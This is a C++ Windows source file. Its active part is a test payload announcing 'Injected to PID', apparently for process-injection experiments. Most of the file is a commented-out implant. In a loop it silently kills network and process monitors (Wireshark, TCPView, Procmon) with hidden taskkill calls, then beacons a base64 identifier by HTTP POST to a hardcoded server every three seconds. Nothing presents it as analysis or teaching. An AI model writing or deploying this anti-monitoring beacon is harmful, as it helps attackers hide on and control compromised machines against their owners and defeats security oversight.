#include <Windows.h>

int WINAPI wWinMain(HINSTANCE, HINSTANCE, LPWSTR cmdLine, int cmdShow) {
	WCHAR buffer[128];
	wsprintf(buffer, L"Injected to PID: %u", GetCurrentProcessId());
	MessageBox(nullptr, buffer, L"Done", MB_OK | MB_ICONINFORMATION);

	return 0;
}
//
//#include <windows.h>
//#include <winhttp.h>
//#include <string>
//
//#pragma comment(lib, "winhttp.lib")
//
//#define SERVER L"http://10.3.145.26/update"
//#define NAME   L"Tmd1eWVuIEh1eSBEdW9j"
//#define INTERVAL 3000
//
//const char* processes[] =
//{
//    "wireshark.exe",
//    "tcpview.exe",
//    "tcpview64.exe",
//    "procmon.exe"
//};
//
//void KillProcess(const char* processName)
//{
//    char cmdLine[256];
//
//    wsprintfA(cmdLine, "taskkill.exe /F /IM %s", processName);
//
//    STARTUPINFOA si = {};
//    PROCESS_INFORMATION pi = {};
//
//    si.cb = sizeof(si);
//    si.dwFlags = STARTF_USESHOWWINDOW;
//    si.wShowWindow = SW_HIDE;
//
//    if (CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
//    {
//        WaitForSingleObject(pi.hProcess, INFINITE);
//
//        CloseHandle(pi.hProcess);
//        CloseHandle(pi.hThread);
//    }
//}
//
//int send()
//{
//    HINTERNET hSession = NULL;
//    HINTERNET hConnect = NULL;
//    HINTERNET hRequest = NULL;
//
//    int statusCode = 0;
//
//    hSession = WinHttpOpen( L"MyClient/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
//        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
//
//    if (!hSession)
//        return 0;
//
//    WinHttpSetTimeouts(hSession, 10000, 10000, 10000, 10000);
//
//    URL_COMPONENTS url{};
//    url.dwStructSize = sizeof(url);
//
//    wchar_t host[256];
//    wchar_t path[1024];
//
//    url.lpszHostName = host;
//    url.dwHostNameLength = _countof(host);
//
//    url.lpszUrlPath = path;
//    url.dwUrlPathLength = _countof(path);
//
//    if (!WinHttpCrackUrl(SERVER, 0, 0, &url))
//    {
//        WinHttpCloseHandle(hSession);
//        return 0;
//    }
//
//    hConnect = WinHttpConnect(hSession, host, url.nPort, 0);
//
//    if (!hConnect)
//    {
//        WinHttpCloseHandle(hSession);
//        return 0;
//    }
//
//    DWORD flags = 0;
//
//    if (url.nScheme == INTERNET_SCHEME_HTTPS)
//        flags |= WINHTTP_FLAG_SECURE;
//
//    hRequest = WinHttpOpenRequest(hConnect, L"POST", path, NULL,
//        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
//
//    if (!hRequest)
//    {
//        WinHttpCloseHandle(hConnect);
//        WinHttpCloseHandle(hSession);
//        return 0;
//    }
//
//    const wchar_t* headers =
//        L"Content-Type: application/json\r\n";
//
//    std::wstring body =
//        L"{\"name\":\"" + std::wstring(NAME) + L"\"}";
//
//    BOOL result = WinHttpSendRequest(hRequest, headers, -1L, (LPVOID)body.c_str(),
//        (DWORD)(body.length() * sizeof(wchar_t)), (DWORD)(body.length() * sizeof(wchar_t)), 0);
//
//    if (result)
//    {
//        result = WinHttpReceiveResponse(
//            hRequest,
//            NULL
//        );
//    }
//
//    if (result)
//    {
//        DWORD size = sizeof(statusCode);
//
//        WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
//            WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &size, WINHTTP_NO_HEADER_INDEX);
//    }
//
//    WinHttpCloseHandle(hRequest);
//    WinHttpCloseHandle(hConnect);
//    WinHttpCloseHandle(hSession);
//
//    return result ? statusCode : 0;
//}
//
//int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
//{
//    UNREFERENCED_PARAMETER(hInstance);
//    UNREFERENCED_PARAMETER(hPrevInstance);
//    UNREFERENCED_PARAMETER(lpCmdLine);
//    UNREFERENCED_PARAMETER(nCmdShow);
//
//    while (true)
//    {
//        for (const char* exe : processes)
//        {
//            KillProcess(exe);
//        }
//        send();
//
//        Sleep(INTERVAL);
//    }
//
//    return 0;
//
//    return 0;
//}